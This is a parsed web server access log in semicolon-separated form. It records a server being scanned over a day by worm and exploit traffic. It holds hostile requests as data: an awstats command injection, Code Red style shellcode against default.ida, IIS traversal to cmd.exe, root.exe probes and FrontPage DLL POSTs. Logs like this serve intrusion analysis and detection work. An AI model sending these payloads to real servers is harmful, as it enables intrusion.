"rhost";"date";"time";"timezone";"method";"request_first_line";"http_version";"final_state_code";"bytes";"referer";"user_agent";"compatibility";"MSIE";"MSIE_version";"OS";"OS_version"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:39";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:39";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:42";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:42";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:42";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:42";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:42";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:42";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:43";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:44";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:53";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:47";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:35";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:37";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:37";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:34";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:40";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:36";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:33";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;329;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:41";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"64.122.238.114";"Mar 07";"11:58:30";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"210.51.12.238";"Mar 07";"11:56:37";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:34";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;329;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:37";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:33";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;329;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:32";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;329;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:38";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:32";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;329;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:34";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;328;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"210.51.12.238";"Mar 07";"11:56:34";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";200;329;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"64.122.238.114";"Mar 07";"12:12:12";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:12:17";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:12:40";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:18:54";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:24:27";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:38:18";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:38:36";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"12:52:06";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"13:19:47";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"64.122.238.114";"Mar 07";"13:38:06";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"63.226.106.228";"Mar 07";"14:08:12";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"63.102.226.241";"Mar 07";"14:48:11";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"82.141.232.238";"Mar 07";"15:52:53";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"65.96.54.37";"Mar 07";"16:07:38";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"61.10.7.18";"Mar 07";"17:17:52";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"216.171.174.124";"Mar 07";"17:43:59";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:55:00";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:55:51";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:56:18";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:56:39";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:57:03";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:57:20";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:57:45";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:58:25";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:58:39";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:58:58";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:59:16";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"17:59:42";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:00:04";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:00:45";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:01:21";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1050;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:01:58";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1050;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:02:46";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:03:58";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:04:49";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:05:47";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:07:46";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:41:43";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1050;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"18:48:45";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"222.166.160.14";"Mar 07";"19:11:11";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"216.171.174.124";"Mar 07";"19:13:01";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"216.171.174.124";"Mar 07";"20:31:23";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"70.183.86.76";"Mar 07";"23:02:56";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"67.162.65.157";"Mar 07";"23:06:20";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:21";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:21";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:21";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:21";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:21";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:21";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:22";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:22";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:22";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:22";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:22";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:23";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:23";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:23";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.65.157";"Mar 07";"23:06:23";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.6.250.202";"Mar 08";"00:10:23";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"217.28.160.220";"Mar 08";"00:46:16";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"216.171.174.124";"Mar 08";"01:53:39";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"63.250.143.9";"Mar 08";"02:44:18";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"216.171.174.124";"Mar 08";"02:50:54";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"203.160.1.69";"Mar 08";"04:01:53";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.19.99.200";"Mar 08";"04:21:25";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"222.166.160.215";"Mar 08";"05:05:56";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"202.82.153.226";"Mar 08";"06:17:37";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
